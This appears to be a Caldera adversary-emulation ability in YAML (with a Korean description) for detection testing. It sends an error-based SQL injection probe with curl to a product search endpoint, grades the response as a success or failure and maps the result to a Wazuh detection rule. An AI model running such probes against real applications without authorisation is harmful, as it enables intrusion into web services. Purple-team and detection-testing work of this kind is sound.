- id: e3f1a9c7-2b4d-4e6f-a8c2-5d7e9f1b3a5c
  name: SQL Injection - Error-Based Probe (Step 1)
  description: >-
    SQL Injection error-based probe. 공격자 측에서 응답을 파싱해 verdict(sqli.verdict)와 근거(sqli.evidence.kind)를
    fact 로 산출한다 (결정1). SQL 에러가 응답에 노출되면 SUCCEEDED/RESPONSE_PATTERN, 500만 나오면 EXECUTED,
    그 외 FAILED. 응답 본문 원문은 기록하지 않는다. 매핑 T1190. 탐지 대상 Wazuh rule 100210.
    주의: Caldera 는 명령 개행을 제거하므로 각 구문은 ';' 로 종료한다.
  tactic: initial-access
  technique:
    attack_id: T1190
    name: Exploit Public-Facing Application
  platforms:
    linux:
      sh:
        command: |-
          OP_ID="#{paw}";
          TECH_ID="T1190";
          ABILITY_ID="e3f1a9c7-2b4d-4e6f-a8c2-5d7e9f1b3a5c";
          TARGET="http://#{target.url}";
          H1="X-Caldera-Op-Id: ${OP_ID}";
          H2="X-Caldera-Technique: ${TECH_ID}";
          H3="X-Caldera-Ability: ${ABILITY_ID}";
          UA="Caldera/${OP_ID}/${TECH_ID}/${ABILITY_ID}";
          RESP=$(curl -s -m 8 -w "\n__CODE__:%{http_code}" -H "$H1" -H "$H2" -H "$H3" -A "$UA" "${TARGET}/api/products/search?keyword=%27");
          BODY=$(printf '%s' "$RESP" | sed '$d');
          CODE=$(printf '%s' "$RESP" | tail -n1 | cut -d: -f2);
          V=FAILED; K=none;
          if printf '%s' "$BODY" | grep -qE "sql_state|BadSqlGrammar|bad SQL grammar"; then V=SUCCEEDED; K=RESPONSE_PATTERN;
          elif [ "$CODE" = "500" ]; then V=EXECUTED; K=none;
          else V=FAILED; K=none; fi;
          printf '{"verdict":"%s","evidence_kind":"%s"}\n' "$V" "$K";
        parsers:
          plugins.stockpile.app.parsers.json:
          - source: sqli.verdict
            custom_parser_vals:
              json_key: verdict
              json_type: str
          - source: sqli.evidence.kind
            custom_parser_vals:
              json_key: evidence_kind
              json_type: str
